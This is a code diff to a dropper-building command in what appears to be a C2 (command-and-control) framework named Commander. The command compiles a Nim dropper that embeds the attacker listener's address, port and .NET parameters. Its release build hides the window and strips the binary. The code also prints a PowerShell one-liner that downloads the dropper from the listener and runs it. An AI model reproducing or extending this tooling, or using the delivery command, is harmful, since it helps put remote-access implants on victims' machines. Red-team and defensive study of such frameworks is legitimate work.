@@ -26,7 +26,7 @@ namespace Commander.Commands.Laucher
     }
     public class BuildDropperCommand : EnhancedCommand<BuildStagerCommandCommandOptions>
     {
-        public static string ScriptFolder { get; set; } = "/Share/tmp/C2/Commander/Script";
+       
 
         public override string Category => CommandCategory.Commander;
         public override string Description => "Create a dropper file";
@@ -54,51 +54,21 @@ namespace Commander.Commands.Laucher
                 return false;
             }
 
-            //nim c --app:console -f -d:mingw -o:Downloader Dowloader.nim
-
-            string nimExecutable = "/usr/bin/nim";
-
-            if (!File.Exists(nimExecutable))
-            {
-                context.Terminal.WriteError($"Cannot find {nimExecutable}");
-                return false;
-            }
-
-            string path = ScriptFolder;
-
             var dotnetparms = (listener.Secured ? "https" : "http") + ":" + listener.Ip + ":" + listener.PublicPort;
 
             string outPath = Path.Combine("/tmp", context.Options.fileName);
-            var parms = new List<string>();
-            parms.Add("c");
-            if (context.Options.debug)
-            {
-                path =  Path.Combine(path, "dropper.nim");
-                parms.Add("--app:console");
-            }
-            else
-            {
-                //remove echo lines from source
-                path =  Path.Combine(path, "dropper_release.nim");
-                parms.Add("--app:gui");
-                parms.Add("-d:release");
-                parms.Add("-d:strip");
-                parms.Add("--passL:-s");
-            }
-            parms.Add("-f");
-            parms.Add("-d:mingw");
-            parms.Add($"-o:{outPath}");
+            var parms = BuildHelper.ComputeNimBuildParameters("dropper", outPath, false, false);
+
             parms.Add($"-d:ServerPort=80");
             parms.Add($"-d:ServerAddress={listener.Ip}");
             parms.Add($"-d:DotNetParams={dotnetparms}");
 
-            parms.Add($"{path}");
 
             context.Terminal.WriteLine($"[>] Generating dropper...");
 
             if (context.Options.verbose)
-                context.Terminal.WriteLine($"[>] Executing: {nimExecutable} {string.Join(" ", parms)}");
-            var executionResult = BuildHelper.ExecuteCommand(nimExecutable, parms, ScriptFolder);
+                context.Terminal.WriteLine($"[>] Executing: nim {string.Join(" ", parms)}");
+            var executionResult = BuildHelper.NimBuild(parms);
 
             if (context.Options.verbose)
                 context.Terminal.WriteLine(executionResult.Out);
@@ -120,8 +90,6 @@ namespace Commander.Commands.Laucher
 
                 context.Terminal.WriteLine($"[>] Command : powershell -c \"iwr -Uri '{url}' -OutFile '{context.Options.fileName}'; .\\{context.Options.fileName}\"");
             }
-
-
 
             return true;
         }
